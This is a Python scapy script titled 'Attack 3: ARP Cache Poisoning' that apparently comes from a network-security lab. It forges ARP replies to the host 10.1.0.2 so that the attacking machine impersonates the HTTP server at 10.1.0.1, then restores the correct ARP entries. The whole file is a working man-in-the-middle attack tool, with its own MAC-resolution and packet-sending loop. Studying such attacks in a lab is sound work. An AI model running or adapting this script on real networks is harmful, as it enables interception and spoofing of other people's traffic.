#!/usr/bin/env python3
# Attack 3: ARP Cache Poisoning
# Run from ws3 to poison ws2's ARP cache


from scapy.all import *
import time

# ws2 is the victim
VICTIM_IP = "10.1.0.2"
VICTIM_MAC = "ee:fe:87:27:f2:06"

# http server we want to impersonate
TARGET_IP = "10.1.0.1"

# How many poison packets to send
COUNT = 10

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = srp(arp_request_broadcast, timeout=2, verbose=0)[0]
    if answered:
        return answered[0][1].hwsrc
    return None

def poison(victim_ip, victim_mac, spoof_ip):
    # Send fake ARP reply to victim
    # "I am spoof_ip, my MAC is MY MAC (ws3's MAC)"
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore(victim_ip, victim_mac, target_ip, target_mac):
    # Restore correct ARP entries after attack
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                 psrc=target_ip, hwsrc=target_mac)
    send(packet, count=5, verbose=0)

if __name__ == "__main__":
    print(f"[*] Getting real MAC of {TARGET_IP}...")
    target_mac = get_mac(TARGET_IP)
    if not target_mac:
        print(f"[-] Could not get MAC of {TARGET_IP}")
        exit(1)
    print(f"[*] Real MAC of http server: {target_mac}")

    print(f"\n[*] Starting ARP poisoning...")
    print(f"[*] Victim: {VICTIM_IP} ({VICTIM_MAC})")
    print(f"[*] Impersonating: {TARGET_IP}")

    # Show ws2's ARP cache before attack
    print(f"\n[*] Sending {COUNT} poison packets...")
    for i in range(COUNT):
        poison(VICTIM_IP, VICTIM_MAC, TARGET_IP)
        print(f"  [+] Sent poison packet {i+1}/{COUNT}")
        time.sleep(1)

    print(f"\n[*] Restoring ARP tables...")
    restore(VICTIM_IP, VICTIM_MAC, TARGET_IP, target_mac)
    print(f"[+] Done! ARP tables restored.")
